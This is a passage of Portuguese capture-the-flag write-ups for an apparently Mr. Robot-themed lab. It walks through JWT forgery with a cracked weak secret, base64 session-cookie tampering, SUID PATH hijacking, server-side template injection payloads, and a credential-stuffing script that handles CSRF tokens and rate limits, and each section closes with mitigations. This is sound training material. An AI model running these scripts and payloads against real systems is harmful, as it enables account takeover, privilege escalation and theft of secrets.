A secret `mrrobot` foi usada para validar a assinatura original do token antigo.

O teste confirmou que a assinatura calculada com `mrrobot` correspondia à assinatura original do JWT de Tyrell.

Isto provou que a secret real da API era:

```text
mrrobot
```

Esta secret é fraca e previsível, especialmente considerando o contexto temático do desafio.

---

## 11. Criação de novo JWT válido

Com a secret descoberta, foi gerado um novo JWT mantendo os campos originais de Tyrell, mas atualizando o campo `exp` para um valor futuro em Unix Epoch.

Script usado:

```bash
python3 - << 'EOF'
import base64, json, time, hmac, hashlib

secret = b"mrrobot"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "sub": "tyrell.wellick",
    "name": "Tyrell Wellick",
    "role": "cto",
    "department": "Technology",
    "exp": int(time.time()) + 3600
}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
s = b64url(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())

print(f"{h}.{p}.{s}")
EOF
```

Este script criou um token válido, assinado com HS256 usando a secret `mrrobot`.

---

## 12. Acesso ao endpoint restrito

O novo token foi usado no endpoint:

```text
/api/admin/secrets
```

Pedido realizado:

```bash
TOKEN='TOKEN_GERADO'

curl -i http://ch12-api/api/admin/secrets \
-H "Authorization: Bearer $TOKEN"
```

Como o token tinha:

```text
role = cto
exp = data futura
assinatura HS256 válida
```

a API aceitou o pedido e devolveu os dados restritos.

---

## 13. Flag obtida

![Flag](resources/2026-05-26-10-17-56.png)

A flag encontrada foi:

```text
FLAG{ch12_cc743df78f45d8ad0267bc334057a6ea}
```

---

## 14. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso a http://ch12-api
→ identificação de autenticação JWT com HS256
→ identificação do CDN ch12-cdn
→ leitura de /cached-tokens.json
→ obtenção de token antigo de Tyrell
→ teste do token contra /api/admin/secrets
→ confirmação de token expirado
→ análise do token no jwt.io
→ identificação do campo exp em Unix Epoch
→ tentativa de alterar exp diretamente
→ falha por assinatura inválida
→ criação de wordlist personalizada
→ descoberta da secret fraca mrrobot
→ geração de novo JWT com exp futuro
→ assinatura com HS256 usando mrrobot
→ acesso a /api/admin/secrets
→ obtenção da flag
```

---

## 15. Vulnerabilidades identificadas

### 15.1. Tokens sensíveis em cache

O ficheiro `cached-tokens.json` expunha tokens antigos, incluindo um token de um utilizador CTO.

Mesmo expirados, estes tokens revelavam a estrutura do JWT e os campos necessários para falsificação.

---

### 15.2. Secret JWT fraca

A secret usada para HS256 era:

```text
mrrobot
```

Esta secret era curta, previsível e relacionada com o tema do ambiente, tornando possível a sua descoberta através de uma wordlist contextual.

---

### 15.3. Uso de HS256 com secret simétrica fraca

HS256 depende da confidencialidade da secret. Se a secret for fraca ou descoberta, qualquer atacante pode assinar tokens válidos.

---

### 15.4. Falta de rotação efetiva de tokens

Apesar de as credenciais de Tyrell terem sido revogadas, um token antigo ainda estava disponível em cache.

Mesmo estando expirado, permitiu reconstruir o payload necessário para forjar um token válido.

---

## 16. Impacto

A falha permitiu:

- obter um token antigo de um utilizador privilegiado;
- identificar o formato esperado do JWT;
- descobrir a secret usada para assinatura;
- criar um token com privilégios de CTO;
- aceder a informação restrita em `/api/admin/secrets`;
- obter a flag.

Num ambiente real, isto representaria comprometimento total de endpoints protegidos por JWT, permitindo impersonação de utilizadores privilegiados.

---

## 17. Recomendações de mitigação

### 17.1. Usar secrets fortes e aleatórias

Secrets JWT devem ser longas, aleatórias e armazenadas em sistemas seguros de gestão de segredos.

Exemplo:

```text
32 bytes ou mais gerados criptograficamente
```

Nunca devem ser usadas palavras previsíveis como:

```text
mrrobot
secret
jwt-secret
ecorp
```

---

### 17.2. Remover tokens de caches públicas ou semi-públicas

Tokens JWT nunca devem ser armazenados em ficheiros servidos por CDN ou sistemas de cache acessíveis.

---

### 17.3. Rotacionar secrets após exposição

Se tokens antigos forem expostos, deve ser feita rotação da secret JWT para invalidar todos os tokens previamente assinados.

---

### 17.4. Reduzir tempo de vida dos tokens

Tokens com permissões elevadas devem ter períodos de validade curtos e mecanismos de revogação eficazes.

---

### 17.5. Evitar exposição de detalhes internos

Mensagens de debug como:

```text
upstream uses HS256 with a symmetric secret
```

não devem estar expostas em ambientes acessíveis.

---

## 18. Conclusão

Neste desafio foi explorada uma implementação JWT insegura. Através do CDN, foi obtido um token antigo de Tyrell, com privilégios de CTO, mas expirado.

A análise com `jwt.io` permitiu identificar o header, o payload e o campo `exp` em Unix Epoch. Depois foi criada uma wordlist contextual para descobrir a secret HS256 usada pela aplicação.

A secret encontrada foi:

```text
mrrobot
```

Com esta secret, foi possível gerar um novo JWT válido, com `exp` atualizado para uma data futura, e assinado corretamente com HS256.

O token forjado permitiu aceder ao endpoint restrito:

```text
/api/admin/secrets
```

A flag obtida foi:

```text
FLAG{ch12_cc743df78f45d8ad0267bc334057a6ea}
```

# CH13

## 1. Identificação do desafio

**Categoria:** Web — Cookie Tampering  
**Alvo:** `http://ch13-web`  
**Objetivo:** Explorar uma cookie de sessão armazenada no lado do cliente, codificada em Base64, mas sem assinatura e sem encriptação, para alterar privilégios e aceder a dados classificados.

---

## 2. Contexto inicial

O desafio indicava que a aplicação interna do FBI guardava a sessão do utilizador numa cookie chamada:

```text
session_data
```

A hint fornecida foi:

```text
Log in with any username and password fbi2015.
Inspect the session_data cookie in your browser dev tools.
```

A descrição do desafio também indicava que a cookie era:

```text
base64-encoded
unsigned
unencrypted
```

Isto sugeria que a aplicação confiava nos dados enviados pelo cliente e não validava a integridade da sessão no lado do servidor.

---

## 3. Login na aplicação

Foi acedida a página:

```text
http://ch13-web
```

De seguida, foi efetuado login com qualquer nome de utilizador e a password indicada no desafio:

```text
fbi2015
```

Após o login, a aplicação criou uma cookie de sessão no browser.

---

## 4. Inspeção da cookie

A cookie foi analisada através das Developer Tools do browser:

```text
F12 → Application/Storage → Cookies → http://ch13-web
```

Foi identificada a cookie:

```text
session_data
```

O valor da cookie era:

```text
eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWdlbnQiLCAiY2xlYXJhbmNlIjogIlNFQ1JFVCJ9
```

À primeira vista, o valor parecia estar codificado em Base64.

---

## 5. Decodificação da cookie

Para confirmar o conteúdo da cookie, foi usada a ferramenta `base64` no terminal:

```bash
echo eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWdlbnQiLCAiY2xlYXJhbmNlIjogIlNFQ1JFVCJ9 | base64 -d
```

O resultado foi:

```json
{"user": "admin", "role": "agent", "clearance": "SECRET"}
```

Isto confirmou que a cookie continha diretamente os dados da sessão em formato JSON.

Os campos relevantes eram:

```text
user: admin
role: agent
clearance: SECRET
```

---

## 6. Identificação da vulnerabilidade

A vulnerabilidade estava no facto de a aplicação guardar informação sensível de autorização diretamente no cliente.

Como a cookie estava apenas codificada em Base64, e não assinada nem encriptada, foi possível alterar manualmente os valores da sessão.

O campo mais relevante era:

```text
role
```

Inicialmente, o valor era:

```text
agent
```

Para tentar obter acesso privilegiado, este valor foi alterado para:

```text
admin
```

Também foi possível manipular o campo:

```text
clearance
```

para aumentar o nível de acesso.

---

## 7. Manipulação da cookie

Foi criada uma nova versão da sessão com privilégios superiores:

```json
{"user":"admin","role":"admin","clearance":"TOP_SECRET"}
```

De seguida, este JSON foi novamente codificado em Base64:

```bash
echo -n '{"user":"admin","role":"admin","clearance":"TOP_SECRET"}' | base64 -w 0
```

O parâmetro `-n` foi usado para evitar a inclusão de uma nova linha no final do texto, o que poderia alterar o valor codificado.

O parâmetro `-w 0` foi usado para gerar o Base64 numa única linha.

---

## 8. Substituição da cookie no browser

Após gerar o novo valor em Base64, a cookie `session_data` foi substituída manualmente nas Developer Tools do browser.

O processo foi:

```text
F12
→ Application/Storage
→ Cookies
→ http://ch13-web
→ session_data
→ substituir o valor antigo pelo novo Base64
→ recarregar a página
```

Como a aplicação confiava nos dados da cookie, passou a interpretar o utilizador como tendo permissões superiores.

---

## 9. Acesso aos dados classificados

Depois de alterar a cookie e recarregar a aplicação, foi possível aceder à área classificada.

A aplicação aceitou os novos valores enviados na cookie e apresentou a informação protegida.

A flag obtida foi:

```text
FLAG{ch13_dc36075947e7c9a2ec72fa73baeccb57}
```

---

## 10. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao ch13-web
→ login com qualquer username e password fbi2015
→ inspeção da cookie session_data no browser
→ identificação de cookie codificada em Base64
→ decode da cookie
→ descoberta dos campos user, role e clearance
→ alteração de role para admin
→ alteração de clearance para TOP_SECRET
→ encode novamente em Base64
→ substituição da cookie no browser
→ acesso a dados classificados
→ obtenção da flag
```

---

## 11. Vulnerabilidade identificada

A vulnerabilidade explorada foi **Cookie Tampering**.

Mais especificamente, a aplicação armazenava dados de autorização no lado do cliente sem proteção criptográfica.

A cookie era:

```text
codificada em Base64
não assinada
não encriptada
validada de forma insegura pelo servidor
```

O problema principal é que Base64 não é encriptação. É apenas uma codificação facilmente reversível.

---

## 12. Impacto

Esta falha permitiu:

- visualizar o conteúdo da sessão;
- alterar manualmente o papel do utilizador;
- aumentar o nível de clearance;
- contornar controlos de autorização;
- aceder a dados classificados;
- obter a flag.

Num cenário real, esta vulnerabilidade poderia permitir que qualquer utilizador autenticado aumentasse os seus próprios privilégios e acedesse a dados sensíveis.

---

## 13. Recomendações de mitigação

### 13.1. Não confiar em dados de autorização enviados pelo cliente

Campos como `role`, `clearance`, permissões ou grupos de acesso não devem ser armazenados de forma editável no lado do cliente.

O servidor deve obter estes dados a partir de uma fonte confiável, como uma base de dados ou sessão server-side.

---

### 13.2. Assinar cookies de sessão

Se for necessário guardar dados no cliente, a cookie deve ser assinada com uma chave secreta no servidor.

Desta forma, qualquer alteração feita pelo cliente invalida a assinatura.

---

### 13.3. Encriptar dados sensíveis

Se a cookie contiver informação sensível, os dados devem ser encriptados.

No entanto, mesmo com encriptação, a autorização final deve continuar a ser validada no servidor.

---

### 13.4. Usar sessões server-side

Uma alternativa mais segura é guardar apenas um identificador de sessão aleatório no browser e manter os dados reais da sessão no servidor.

Exemplo:

```text
cookie: session_id=random_value
servidor: associa session_id ao utilizador e permissões reais
```

---

### 13.5. Validar autorização no backend

A aplicação deve verificar, do lado do servidor, se o utilizador tem permissão real para aceder a recursos classificados.

O frontend ou a cookie nunca devem ser a única fonte de decisão de autorização.

---

## 14. Conclusão

Neste desafio foi explorada uma falha de cookie tampering numa aplicação web.

A aplicação guardava a sessão numa cookie `session_data` codificada em Base64. Após decodificar a cookie, foi possível observar que continha dados de autorização em JSON, incluindo `role` e `clearance`.

Como a cookie não era assinada nem encriptada, os valores foram alterados manualmente para elevar privilégios. Depois de codificar novamente o JSON em Base64 e substituir a cookie no browser, a aplicação passou a reconhecer o utilizador como privilegiado.

![Flag](resources/2026-05-26-10-26-37.png)

A flag obtida foi:

```text
FLAG{ch13_dc36075947e7c9a2ec72fa73baeccb57}
```

O desafio demonstra a importância de nunca confiar em dados de autorização controlados pelo cliente e de proteger corretamente cookies de sessão.


# CH14

## 1. Identificação do desafio

**Categoria:** Linux — SUID Privilege Escalation  
**Alvo:** `ch14-server`  
**Utilizador inicial:** `angela.moss`  
**Objetivo:** Encontrar um binário SUID incomum no sistema e explorá-lo para ler a flag localizada em `/opt/flag.txt`, acessível apenas pelo utilizador `flagreader`.

---

## 2. Contexto inicial

O desafio indicava que o acesso inicial era feito com uma conta de baixo privilégio:

```text
ssh angela.moss@ch14-server
```

A flag encontrava-se em:

```text
/opt/flag.txt
```

No entanto, o ficheiro só podia ser lido pelo utilizador:

```text
flagreader
```

A hint indicava o seguinte comando para procurar binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## 3. Enumeração de binários SUID

Após entrar no servidor como `angela.moss`, foi executado o comando sugerido:

```bash
find / -perm -4000 -type f 2>/dev/null
```

O resultado foi:

```text
/usr/local/bin/ecorp-status
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
```

A maioria dos binários encontrados eram comuns em sistemas Linux. O binário invulgar era:

```text
/usr/local/bin/ecorp-status
```

---

## 4. Análise das permissões do binário

Foi analisado o binário suspeito:

```bash
ls -la /usr/local/bin/ecorp-status
```

O resultado foi:

```text
-rwsr-xr-x 1 flagreader flagreader 16184 Apr 27 18:51 /usr/local/bin/ecorp-status
```

Esta permissão revelou dois pontos importantes:

```text
O binário tinha o bit SUID ativo
O dono do binário era o utilizador flagreader
```

Isto significava que, ao executar `/usr/local/bin/ecorp-status`, o programa corria com permissões efetivas de `flagreader`.

---

## 5. Análise com strings

De seguida, foi usado o comando `strings` para procurar comandos ou chamadas relevantes dentro do binário:

```bash
strings /usr/local/bin/ecorp-status | grep -iE "cat|sh|bash|system|exec|flag|opt|status|uptime|date|hostname|PATH"
```

O resultado relevante foi:

```text
fflush
system
E Corp System Status
date
uptime
ecorp-status.c
system@GLIBC_2.2.5
fflush@GLIBC_2.2.5
.shstrtab
.gnu.hash
```

Também foi identificado posteriormente que o binário chamava:

```text
date
whoami
uptime
```

A presença de `system` juntamente com comandos como `date`, `whoami` e `uptime` sugeria que o binário executava comandos do sistema sem caminho absoluto.

Isto indicava uma possível vulnerabilidade de **PATH hijacking**.

---

## 6. Execução inicial do binário

Ao executar o binário:

```bash
/usr/local/bin/ecorp-status
```

A aplicação apresentou:

```text
E Corp System Status
====================
Tue May 26 14:53:03 UTC 2026
flagreader
14:53:03 up 78 days, 4:30, 0 users, load average: 0.12, 0.20, 0.24
```

O output `flagreader` confirmou que pelo menos uma parte do binário estava a correr com permissões efetivas do utilizador `flagreader`.

---

## 7. Tentativas iniciais de exploração

Inicialmente, foi tentado criar comandos falsos em `/tmp`, como `date`, `whoami` e `uptime`, para que o binário os executasse através do `PATH`.

Exemplo:

```bash
cd /tmp
printf '#!/bin/sh\n/bin/cat /opt/flag.txt\n' > date
chmod +x date
export PATH=/tmp:$PATH
/usr/local/bin/ecorp-status
```

No entanto, esta tentativa não resultou, pois o sistema continuava a resolver os comandos para:

```text
/usr/bin/whoami
/usr/bin/date
/usr/bin/uptime
```

Também foi tentado usar `/dev/shm`, mas o hijacking não funcionou corretamente nesse diretório.

---

## 8. Exploração bem-sucedida com `/var/tmp/pwn`

A exploração foi bem-sucedida ao criar um diretório controlado pelo utilizador em:

```text
/var/tmp/pwn
```

Foram criados scripts falsos com os nomes dos comandos utilizados pelo binário:

```bash
mkdir -p /var/tmp/pwn
cd /var/tmp/pwn

printf '#!/bin/sh\n/bin/cat /opt/flag.txt\n' > whoami
printf '#!/bin/sh\n/bin/cat /opt/flag.txt\n' > date
printf '#!/bin/sh\n/bin/cat /opt/flag.txt\n' > uptime

chmod +x whoami date uptime
```

Depois, o `PATH` foi alterado para colocar `/var/tmp/pwn` em primeiro lugar:

```bash
export PATH=/var/tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hash -r
```

Foi confirmado que os comandos estavam a ser resolvidos para o diretório controlado:

```bash
command -v whoami
command -v date
command -v uptime
```

O resultado foi:

```text
/var/tmp/pwn/whoami
/var/tmp/pwn/date
/var/tmp/pwn/uptime
```

---

## 9. Leitura da flag

Após preparar o PATH hijacking, foi executado novamente o binário SUID:

```bash
/usr/local/bin/ecorp-status
```

Como o binário executava `whoami`, `date` e `uptime` através de `system()` e sem usar caminhos absolutos, os scripts falsos foram executados com permissões de `flagreader`.

O output devolveu a flag várias vezes:

```text
E Corp System Status
====================
FLAG{ch14_6093f5c33b474f16640cf3d062a5bbb8}
FLAG{ch14_6093f5c33b474f16640cf3d062a5bbb8}
FLAG{ch14_6093f5c33b474f16640cf3d062a5bbb8}
```

A flag obtida foi:

```text
FLAG{ch14_6093f5c33b474f16640cf3d062a5bbb8}
```

---

## 10. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Login SSH como angela.moss
→ enumeração de binários SUID com find
→ identificação de /usr/local/bin/ecorp-status
→ confirmação de SUID com dono flagreader
→ análise com strings
→ identificação de system(), date, whoami e uptime
→ suspeita de PATH hijacking
→ criação de comandos falsos em /var/tmp/pwn
→ alteração do PATH para priorizar /var/tmp/pwn
→ execução do binário SUID
→ execução dos scripts falsos como flagreader
→ leitura de /opt/flag.txt
→ obtenção da flag
```

---

## 11. Vulnerabilidade identificada

A vulnerabilidade explorada foi uma combinação de:

```text
SUID mal configurado
Execução de comandos externos via system()
Uso de comandos sem caminho absoluto
PATH hijacking
```

O binário `/usr/local/bin/ecorp-status` era executado com permissões de `flagreader`, mas chamava comandos externos como:

```text
date
whoami
uptime
```

sem usar caminhos absolutos como:

```text
/usr/bin/date
/usr/bin/whoami
/usr/bin/uptime
```

Isto permitiu ao utilizador controlar qual executável seria chamado, manipulando a variável `PATH`.

---

## 12. Impacto

Esta falha permitiu:

- executar comandos com permissões do utilizador `flagreader`;
- contornar as permissões normais do sistema;
- ler um ficheiro restrito em `/opt/flag.txt`;
- obter acesso a informação sensível protegida por permissões UNIX.

Num ambiente real, uma falha deste tipo poderia permitir escalada de privilégios, leitura de ficheiros sensíveis ou execução de código com permissões de outro utilizador.

---

## 13. Recomendações de mitigação

### 13.1. Evitar `system()` em binários SUID

Binários SUID não devem usar `system()` para executar comandos externos, pois isto pode introduzir riscos de PATH hijacking, command injection e abuso de ambiente.

---

### 13.2. Usar caminhos absolutos

Se for necessário executar comandos externos, devem ser usados caminhos absolutos:

```text
/usr/bin/date
/usr/bin/whoami
/usr/bin/uptime
```

em vez de:

```text
date
whoami
uptime
```

---

### 13.3. Limpar variáveis de ambiente

Binários com SUID devem limpar ou definir explicitamente variáveis de ambiente sensíveis, como:

```text
PATH
LD_PRELOAD
LD_LIBRARY_PATH
IFS
```

---

### 13.4. Aplicar o princípio do menor privilégio

O binário só deve ter SUID se for estritamente necessário. Neste caso, a lógica deveria ser revista para evitar executar comandos externos com permissões elevadas.

---

### 13.5. Rever binários SUID não padrão

Devem ser auditados regularmente binários SUID fora dos caminhos comuns, especialmente em:

```text
/usr/local/bin
/opt
/var
/home
```

---

## 14. Conclusão

Neste desafio foi identificada uma vulnerabilidade de privilege escalation baseada num binário SUID incomum:

```text
/usr/local/bin/ecorp-status
```

O binário pertencia ao utilizador `flagreader` e tinha o bit SUID ativo. A análise revelou que utilizava `system()` para executar comandos como `date`, `whoami` e `uptime` sem caminho absoluto.

Foi explorado um PATH hijacking através da criação de scripts falsos em `/var/tmp/pwn`, que executavam:

```bash
/bin/cat /opt/flag.txt
```

Ao alterar o `PATH` para priorizar `/var/tmp/pwn` e executar o binário SUID, os scripts foram chamados com permissões de `flagreader`, permitindo ler a flag.

A flag obtida foi:

```text
FLAG{ch14_6093f5c33b474f16640cf3d062a5bbb8}
```

O desafio demonstra o risco de combinar SUID com chamadas inseguras a comandos externos e reforça a importância de auditar binários privilegiados.



# CH15

## 1. Identificação do desafio

**Categoria:** Web — SSTI  
**Alvo:** `http://ch15-web`  
**Objetivo:** Explorar uma vulnerabilidade de Server-Side Template Injection no gerador de certificados da aplicação para ler a configuração interna e obter a flag.

---

## 2. Contexto inicial

O desafio apresentava um portal interno da E Corp para reconhecimento de colaboradores.

A funcionalidade principal era um gerador de certificados, onde o utilizador inseria um nome e a aplicação gerava uma mensagem personalizada.

A descrição do desafio indicava:

```text
The certificate generator takes your name and renders it into a template -- but the developer took a shortcut.
```

Esta frase sugeria que o input do utilizador estava a ser inserido diretamente num template do lado do servidor.

---

## 3. Funcionalidade analisada

A aplicação disponibilizava um campo para inserir o nome do colaborador.

Após submeter o formulário, a aplicação gerava um certificado com uma mensagem semelhante a:

```text
Generating certificate for: <nome>
Thank you for your outstanding contributions to E Corp!
Certificate ID: ECORP-REC-2024-92355
```

Como o input era refletido na resposta, foi possível testar se o valor era apenas impresso como texto ou se era interpretado por um template engine.

---

## 4. Teste inicial de SSTI

Foi usado o payload:

```text
a{{7*7}}
```

A resposta da aplicação apresentou:

```text
a49
```

Este resultado confirmou que a expressão `{{7*7}}` foi interpretada no servidor e avaliada como `49`.

Assim, ficou confirmada a existência de uma vulnerabilidade de **Server-Side Template Injection**.

---

## 5. Identificação do comportamento do template

O uso de expressões entre `{{ }}` e a avaliação matemática indicavam um template engine compatível com este tipo de sintaxe, como Jinja2 ou semelhante.

O comportamento observado foi:

```text
Input:  a{{7*7}}
Output: a49
```

Isto demonstrou que a aplicação não estava a tratar o nome do colaborador como texto literal. Em vez disso, estava a renderizar o input dentro do template no lado do servidor.

---

## 6. Exploração da vulnerabilidade

Como o objetivo do desafio era “Read the config”, foi testado o acesso ao objeto `config` do template engine.

O payload utilizado no campo do nome foi:

```text
{{config.items()}}
```

Este payload permitiu listar os itens da configuração da aplicação.

Através dessa listagem, foi possível identificar a flag armazenada na configuração interna da aplicação.

---

## 7. Obtenção da flag

Ao inserir o payload:

```text
{{config.items()}}
```

no campo de input do gerador de certificados, a aplicação apresentou os valores da configuração interna.

Entre os valores devolvidos, foi encontrada a flag:

```text
FLAG{ch15_1d64309a880b81db0c97178135e086fd}
```

---

## 8. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao portal ch15-web
→ identificação do gerador de certificados
→ inserção de payload no campo de nome
→ teste com a{{7*7}}
→ confirmação de SSTI através do output a49
→ inserção de {{config.items()}}
→ leitura da configuração da aplicação
→ obtenção da flag
```

---

## 9. Vulnerabilidade identificada

A vulnerabilidade explorada foi **Server-Side Template Injection**.

Esta vulnerabilidade ocorre quando input controlado pelo utilizador é processado por um template engine no lado do servidor, permitindo que expressões sejam avaliadas pela aplicação.

Neste caso, o input do campo de nome era interpretado como parte do template, permitindo avaliar expressões como:

```text
{{7*7}}
```

O resultado `49` confirmou a execução no contexto do template.

---

## 10. Impacto

A vulnerabilidade permitiu:

- executar expressões dentro do template engine;
- aceder a variáveis internas da aplicação;
- consultar a configuração da aplicação;
- obter informação sensível armazenada em configuração;
- recuperar a flag do desafio.

Num ambiente real, dependendo do template engine e das proteções existentes, uma SSTI pode permitir leitura de ficheiros, exposição de secrets, execução de comandos ou comprometimento total do servidor.

---

## 11. Recomendações de mitigação

### 11.1. Não renderizar input do utilizador como template

O input do utilizador deve ser tratado como dados, não como código de template.

A aplicação não deve construir templates dinamicamente com strings vindas diretamente do utilizador.

---

### 11.2. Usar escaping adequado

Valores fornecidos por utilizadores devem ser escapados antes de serem inseridos em páginas HTML ou templates.

---

### 11.3. Separar lógica de templates e dados

O template deve ser definido previamente pela aplicação e os dados devem ser passados como variáveis seguras.

Exemplo conceptual seguro:

```text
template: "Generating certificate for: {{ name }}"
dados: name = input_do_utilizador_escapado
```

O erro acontece quando a própria string controlada pelo utilizador é renderizada como template.

---

### 11.4. Remover secrets da configuração acessível

Informação sensível, como flags, chaves secretas, tokens ou passwords, não deve estar acessível através de objetos expostos ao template.

---

### 11.5. Aplicar sandboxing

Se for inevitável renderizar templates dinâmicos, deve ser usado sandboxing rigoroso, limitando objetos, funções e atributos acessíveis pelo template.

---

## 12. Conclusão

Neste desafio foi explorada uma vulnerabilidade de Server-Side Template Injection no gerador de certificados da aplicação.

O payload:

```text
a{{7*7}}
```

foi avaliado pelo servidor e devolveu:

```text
a49
```

Este comportamento confirmou que o input do utilizador estava a ser interpretado pelo template engine.

A partir daí, foi utilizado o payload:

```text
{{config.items()}}
```

Este payload permitiu listar a configuração interna da aplicação e encontrar diretamente a flag:

![Flag](resources/2026-05-26-10-37-30.png)

```text
FLAG{ch15_1d64309a880b81db0c97178135e086fd}
```

O desafio demonstra o risco de renderizar input controlado pelo utilizador como template e reforça a importância de separar corretamente dados de lógica de apresentação.


# CH 16

## 1. Identificação do desafio

**Categoria:** Web — Brute Force  
**Alvo:** `http://ch16-web`  
**Credential dump:** `http://assets-server/c712e693-e856-1646-1200-7b1c89058497/`  
**Objetivo:** Usar uma lista de credenciais vazadas para encontrar um login válido no portal de colaboradores da E Corp, contornando corretamente CSRF tokens e rate limiting.

---

## 2. Contexto inicial

O desafio indicava que existia um dump com 200 combinações de email/password provenientes de uma fuga antiga da E Corp.

A aplicação alvo era um portal de colaboradores:

```text
http://ch16-web
```

A hint indicava:

```text
Handle CSRF tokens and rate limits (HTTP 429) in your script.
```

Isto sugeria que uma tentativa simples de brute force não funcionaria, porque cada pedido de login precisava de um token CSRF válido e o servidor aplicava rate limiting.

---

## 3. Análise do portal

Ao aceder ao portal, foi identificado um formulário de login com os seguintes campos:

```text
username
password
csrfmiddlewaretoken
```

O formulário enviava os dados para:

```text
/login/
```

Foi observado no HTML:

```html
<form method="POST" action="/login/">
    <input type="hidden" name="csrfmiddlewaretoken" value="...">
```

Também foi identificada uma cookie relacionada com CSRF:

```text
csrftoken
```

Assim, para cada tentativa de login, era necessário obter um token CSRF novo ou válido e enviá-lo juntamente com as credenciais.

---

## 4. Credential dump

O ficheiro de credenciais continha entradas no formato:

```text
email:password
```

Exemplos de entradas:

```text
jessica.morgan@ecorp.com:Sunshine99!
david.chen@ecorp.com:P@ssword123
sarah.williams@ecorp.com:Welcome2015
```

Inicialmente, uma versão do script indicou um falso positivo com:

```text
jessica.morgan@ecorp.com:Sunshine99!
```

No entanto, ao testar manualmente no browser, foi apresentada a mensagem:

```text
Invalid credentials. Access denied.
```

Isto mostrou que o script inicial estava a interpretar incorretamente uma resposta HTTP `200` como sucesso.

---

## 5. Correção do método de deteção

Foi necessário ajustar a lógica do script para distinguir corretamente entre sucesso e falha.

A aplicação devolvia HTTP `200` também em caso de credenciais inválidas, mostrando a mensagem:

```text
Invalid credentials. Access denied.
```

Por isso, o script foi corrigido para considerar falha quando esta mensagem aparecia no corpo da resposta.

Como indicação de sucesso, passou-se a verificar:

```text
HTTP 302
redirect após login
presença de cookie de sessão
ausência da mensagem “Invalid credentials”
```

---

## 6. Script de brute force com CSRF

A abordagem correta foi:

```text
1. Criar uma sessão HTTP persistente
2. Fazer GET a /login/
3. Extrair o csrfmiddlewaretoken do HTML
4. Manter a cookie csrftoken
5. Fazer POST para /login/ com username, password e csrfmiddlewaretoken
6. Verificar se houve HTTP 302 ou sessão autenticada
7. Se ocorrer HTTP 429, aguardar antes de continuar
```

Exemplo de lógica usada no script:

```python
import re
import time
import requests

BASE_URL = "http://ch16-web"
LOGIN_URL = f"{BASE_URL}/login/"
CREDS_FILE = "credentials_dump.txt"

def get_csrf(session):
    r = session.get(LOGIN_URL, timeout=10)
    m = re.search(
        r'name="csrfmiddlewaretoken"\s+value="([^"]+)"',
        r.text
    )
    if not m:
        return None
    return m.group(1)

def attempt_login(username, password):
    session = requests.Session()
    csrf = get_csrf(session)

    data = {
        "csrfmiddlewaretoken": csrf,
        "username": username,
        "password": password,
    }

    headers = {
        "Referer": LOGIN_URL,
        "Origin": BASE_URL,
        "User-Agent": "Mozilla/5.0",
        "X-CSRFToken": csrf,
    }

    r = session.post(
        LOGIN_URL,
        data=data,
        headers=headers,
        timeout=10,
        allow_redirects=False
    )

    return r, session
```

---

## 7. Tratamento de rate limiting

O desafio indicava que o servidor aplicava rate limiting através de respostas HTTP `429`.

Por isso, o script tinha lógica para detetar esse código e aguardar antes de repetir a tentativa:

```python
if r.status_code == 429:
    wait = r.headers.get("Retry-After")
    wait = int(wait) if wait and wait.isdigit() else 5
    time.sleep(wait)
    continue
```

Além disso, foi usada uma pequena pausa entre tentativas para reduzir a probabilidade de atingir o rate limit:

```python
time.sleep(0.8)
```

---

## 8. Credenciais válidas encontradas

Após correr o script corrigido, foi encontrada uma combinação válida:

```text
Username: michael.hansen@ecorp.com
Password: Tr0ub4dor&3
HTTP status: 302
```

O HTTP `302` indicou que o login foi bem-sucedido e que a aplicação redirecionou o utilizador para uma área autenticada.

---

## 9. Obtenção da flag

Após o login válido, a aplicação apresentou a flag:

```text
FLAG{ch16_2bcca1d7a55d88c137a4a869b878541c}
```

---

## 10. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao portal ch16-web
→ análise do formulário de login
→ identificação do campo csrfmiddlewaretoken
→ identificação da cookie csrftoken
→ download/análise do credential dump
→ criação de script com requests.Session()
→ GET a /login/ para obter CSRF
→ POST para /login/ com username, password e CSRF
→ deteção e tratamento de HTTP 429
→ correção de falso positivo causado por HTTP 200 com “Invalid credentials”
→ identificação de login válido com HTTP 302
→ acesso à área autenticada
→ obtenção da flag
```

---

## 11. Vulnerabilidades identificadas

### 11.1. Credential stuffing

A aplicação permitia testar credenciais provenientes de uma fuga antiga.

Mesmo com CSRF e rate limiting, uma lista pequena e controlada pôde ser testada com automação.

---

### 11.2. Reutilização de passwords

A credencial válida encontrada indicou que pelo menos um utilizador ainda tinha uma password presente num dump antigo:

```text
michael.hansen@ecorp.com:Tr0ub4dor&3
```

Isto representa uma falha de higiene de credenciais.

---

### 11.3. Rate limiting insuficiente

Embora existisse rate limiting, ele não impediu totalmente a automação. Apenas obrigou o script a aguardar e controlar melhor a cadência dos pedidos.

---

## 12. Impacto

Esta falha permitiu:

- automatizar tentativas de login contra o portal;
- usar credenciais vazadas de uma fuga anterior;
- autenticar como um colaborador real;
- aceder à área interna do portal;
- obter a flag.

Num ambiente real, este cenário representa um risco elevado, pois credenciais reutilizadas podem permitir acesso indevido a sistemas internos.

---

## 13. Recomendações de mitigação

### 13.1. Forçar reset de passwords após fugas

Após uma fuga de credenciais, todas as passwords afetadas devem ser revogadas e os utilizadores obrigados a definir novas passwords.

---

### 13.2. Implementar MFA

A autenticação multifator reduz significativamente o impacto de credential stuffing, mesmo quando a password está correta.

---

### 13.3. Melhorar rate limiting

O rate limiting deve considerar:

```text
IP de origem
conta alvo
fingerprint do cliente
